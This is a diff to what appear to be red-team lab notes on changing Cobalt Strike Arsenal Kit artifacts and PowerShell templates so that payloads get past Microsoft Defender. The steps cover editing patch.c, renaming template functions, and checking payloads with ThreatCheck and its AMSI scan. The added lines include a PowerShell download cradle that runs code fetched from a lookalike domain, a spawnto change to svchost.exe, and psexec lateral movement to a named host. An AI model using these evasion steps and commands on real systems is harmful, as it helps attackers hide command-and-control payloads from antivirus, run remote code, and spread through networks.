@@ -1,7 +1,7 @@
 
 ### Artifacts
 
-Open the artifacts folder within Visual Studio Code and open up `src-common/patch.c`
+Open the artifacts folder (`arsenal-kit\kits\artifact`) within Visual Studio Code and open up `src-common/patch.c`
 
 On line ~45 modify the for loop. **This is for the svc exe payloads.**
 ```c
@@ -47,12 +47,12 @@ Open up the custom-resources folder in VS code
 
 > Edit **template.x64.ps1** with the following
 
-Rename `func_get_proc_address` on line **3** to:
+Rename **ALL**`func_get_proc_address` on line **3** to (Use Edit > Replace): 
 ```powershell
 get_proc_address
 ```
 
-Rename `func_get_delegate_type` on line **10** to:
+Rename **ALL** `func_get_delegate_type` on line **10** to (Use Edit > Replace):
 ```powershell
 get_delegate_type
 ```
@@ -145,8 +145,12 @@ sudo /usr/bin/docker restart cobaltstrike-cs-1
 Build new payloads:
 - Go to **Payloads > Windows Stageless Generate All Payloads**
 
-Test PowerShell payload against
+Test stageless payload against ThreatCheck
+```powershell
+C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\artifact64big.exe
+```
 
+Test PowerShell payload against ThreatCheck
 ```powershell
 C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e amsi
 ```
@@ -162,5 +166,20 @@ Verify that Defender is enabled and execute up on test host
 ```powershell
 (Get-MpPreference).DisableRealtimeMonitoring
 
-iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/test2")
+iex(iwr "http://www.bleepincomputer.com/test" -useb)
+```
+
+Verify Defender is on on remote host
+```powershell
+remote-exec winrm lon-ws-1 (Get-MpPreference).DisableRealtimeMonitoring
+```
+
+Change `spawnto` for the service payload
+```powershell
+ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
+```
+
+Now lateral movement can be used with the service payload
+```powershell
+jump psexec64 lon-ws-1 smb
 ```
